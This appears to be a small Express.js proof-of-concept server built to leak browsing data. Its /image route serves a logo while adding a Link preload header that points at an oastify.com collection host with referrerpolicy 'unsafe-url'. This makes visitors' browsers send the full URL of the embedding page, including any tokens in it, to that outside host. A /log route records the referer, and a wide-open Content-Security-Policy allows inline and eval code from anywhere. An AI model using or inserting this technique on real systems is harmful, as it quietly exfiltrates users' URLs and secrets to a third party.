const express = require('express');
const app = express();
const port = 3000;
const path = require('path');

app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:");
  next();
});

app.get('/image', (req, res) => {
  res.setHeader(
    'Link',
    '<https://yy02j9pfoty2ss2ymj1crshx0o6fuci1.oastify.com/log>;rel="preload"; as="image"; referrerpolicy="unsafe-url"'
  );
  res.sendFile(path.join(__dirname, 'logo.jpg'));
});

app.get('/log', (req, res) => {
  console.log(req.headers['referer']);
  res.send('Hi!');
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
